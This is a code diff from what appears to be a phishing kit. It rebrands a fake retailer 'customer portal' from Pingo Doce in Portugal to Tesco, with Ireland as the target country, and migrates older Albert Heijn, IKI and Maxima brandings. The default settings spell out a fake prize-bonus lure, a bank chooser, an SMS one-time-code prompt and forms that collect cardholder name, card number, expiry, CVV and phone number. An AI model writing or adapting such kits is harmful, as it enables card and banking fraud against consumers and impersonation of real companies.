@@ -57,9 +57,13 @@ type LegacyGlobalSettings = Partial<GlobalSettings> & {
 };
 
 const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
-const ALBERT_HEIJN_LOGO_URL = "/form-assets/iki-mini-logo.png";
+const ALBERT_HEIJN_LOGO_URL = "/form-assets/tesco-mini-logo.png";
 const PORTAL_BG_URL = "/form-assets/bg-desktop.png";
 const LEGACY_BG_URL = "/spar-bg.png";
+const LEGACY_LOGO_URLS = new Set([
+  "/form-assets/iki-mini-logo.png",
+  "/form-assets/maxima-mini-logo.png",
+]);
 const LEGACY_PORTAL_NAMES = new Set([
   "Albert Heijn klantenportaal",
   "IKI klientų portalas",
@@ -77,52 +81,51 @@ const LEGACY_WIN_TITLES = new Set([
   "Exclusieve Albert Heijn bonus",
   "Išskirtinė IKI premija",
   "Ekskliuzyvinė IKI Premija",
-  "Bónus Exclusivo IKI",
 ]);
 
 export const defaultSettings: GlobalSettings = {
-  logo_url: "/form-assets/iki-mini-logo.png",
+  logo_url: "/form-assets/tesco-mini-logo.png",
   bg_url: PORTAL_BG_URL,
-  portal_name: "Portal do Cliente Pingo Doce",
-  support_center_name: "Apoio ao Cliente Pingo Doce",
-  win_title: "Bónus Exclusivo Pingo Doce",
+  portal_name: "Tesco Customer Portal",
+  support_center_name: "Tesco Customer Service",
+  win_title: "Exclusive Tesco Bonus",
   win_subtitle:
-    "Parabéns! Foi selecionado para a promoção Pingo Doce de hoje. Clique no botão abaixo para resgatar o seu bónus.",
-  win_button: "Resgatar Bónus",
-  banken_title: "Escolha o seu Banco",
-  banken_subtitle: "Selecione o seu banco para continuar.",
-  banken_search_placeholder: "Pesquisar o seu banco...",
-  wait_title: "Por favor, aguarde",
-  wait_subtitle: "O seu pedido está a ser processado com segurança...",
-  sms_title: "Código de Segurança SMS",
-  sms_subtitle: "Introduza o código de {digits} dígitos.",
-  sms_input_label: "Código de utilização única",
-  sms_button: "Confirmar",
-  sms_loading: "A processar...",
-  card_title: "Dados de Pagamento",
-  card_subtitle: "Verifique e confirme os seus dados.",
-  card_owner_label: "Nome do Titular do Cartão",
-  card_number_label: "Número do Cartão",
-  card_expiry_label: "Data de Validade MM/AA",
-  card_cvv_label: "Código de Segurança",
-  card_button: "Continuar",
-  code_title: "Bem-vindo",
-  code_subtitle: "Introduza o código de participação que recebeu de {partner} para desbloquear a sua recompensa.",
-  code_button: "Confirmar Código",
-  live_support_title: "Apoio ao Vivo",
+    "Congratulations! You have been selected for today's Tesco promotion. Click the button below to claim your bonus.",
+  win_button: "Claim Bonus",
+  banken_title: "Choose Your Bank",
+  banken_subtitle: "Select your bank to continue.",
+  banken_search_placeholder: "Search your bank...",
+  wait_title: "Please Wait",
+  wait_subtitle: "Your request is being securely processed...",
+  sms_title: "SMS Security Code",
+  sms_subtitle: "Enter the {digits}-digit code.",
+  sms_input_label: "One-time code",
+  sms_button: "Confirm",
+  sms_loading: "Processing...",
+  card_title: "Payment Details",
+  card_subtitle: "Check and confirm your details.",
+  card_owner_label: "Cardholder Name",
+  card_number_label: "Card Number",
+  card_expiry_label: "Expiry Date MM/YY",
+  card_cvv_label: "Security Code",
+  card_button: "Continue",
+  code_title: "Welcome",
+  code_subtitle: "Enter the participation code you received from {partner} to unlock your reward.",
+  code_button: "Confirm Code",
+  live_support_title: "Live Support",
   live_support_subtitle:
-    "Para continuar, deve contactar o nosso serviço de apoio ao cliente.\n\nClique no botão abaixo para iniciar o chat.",
-  live_support_button: "Iniciar Chat",
-  profile_title_small: "Confirmação de Prémio",
-  profile_title_main: "O Valor do seu Bónus",
-  profile_subtitle: "Confirme os seus dados para processamento posterior.",
-  profile_firstname_label: "Nome",
-  profile_lastname_label: "Apelido",
-  profile_phone_label: "Número de Telemóvel",
-  profile_button: "Seguinte",
-  profile_loading_text: "A processar...",
-  site_language: "pt",
-  target_country: "Portekiz",
+    "To continue, you need to contact our customer service.\n\nClick the button below to start the chat.",
+  live_support_button: "Start Chat",
+  profile_title_small: "Prize Confirmation",
+  profile_title_main: "Your Bonus Amount",
+  profile_subtitle: "Confirm your details for further processing.",
+  profile_firstname_label: "First Name",
+  profile_lastname_label: "Last Name",
+  profile_phone_label: "Mobile Number",
+  profile_button: "Next",
+  profile_loading_text: "Processing...",
+  site_language: "en",
+  target_country: "İrlanda",
   wheel_settings: {},
 };
 
@@ -175,26 +178,28 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
   if (
     !next.logo_url ||
     next.logo_url === "/logo.png" ||
-    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
+    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL ||
+    LEGACY_LOGO_URLS.has(next.logo_url)
   ) {
-    next.logo_url = "/form-assets/iki-mini-logo.png";
+    next.logo_url = ALBERT_HEIJN_LOGO_URL;
   }
 
   if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
     next.bg_url = PORTAL_BG_URL;
   }
 
-  const isLegacyNonPtLanguage =
+  const isLegacyNonEnLanguage =
     !next.site_language ||
     next.site_language === "lt" ||
     next.site_language === "nl" ||
-    next.site_language === "et";
+    next.site_language === "et" ||
+    next.site_language === "pt";
 
-  if (isLegacyNonPtLanguage) {
+  if (isLegacyNonEnLanguage) {
     for (const key of TRANSLATABLE_TEXT_KEYS) {
       (next as Record<string, unknown>)[key] = defaultSettings[key];
     }
-    next.site_language = "pt";
+    next.site_language = "en";
   } else {
     if (!next.portal_name || LEGACY_PORTAL_NAMES.has(next.portal_name)) {
       next.portal_name = defaultSettings.portal_name;
@@ -213,7 +218,7 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
     next.target_country === "Estonya" ||
     next.target_country === "Litvanya"
   ) {
-    next.target_country = "Portekiz";
+    next.target_country = "İrlanda";
   }
 
   if (next.target_country) {
